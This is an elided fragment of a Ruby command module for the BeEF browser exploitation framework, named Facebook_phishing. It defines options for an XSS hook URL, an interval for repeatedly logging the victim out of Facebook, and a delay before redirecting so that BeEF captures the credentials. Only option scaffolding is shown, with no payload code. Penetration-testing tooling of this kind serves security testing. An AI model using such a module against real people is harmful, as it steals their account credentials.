...
#
class Facebook_phishing < BeEF::Core::Command
  def self.options
    ...
    [
      { 'name' => 'xss_hook_url',
        ...
        'value' => xss_hook_url,
        'width' => '300px' }, {
          'name' => 'logout_facebook_interval',
          'description' => 'The victim is continuously loged out of Facebook. This is the interval in ms.',
          'ui_label' => 'Facebook logout interval (ms)',
          'value' => logout_facebook_interval,
          'width' => '100px'
        }, {
          ...
          'before we redirect to the real Facebook page, so that BeEF gets the credentials in time.',
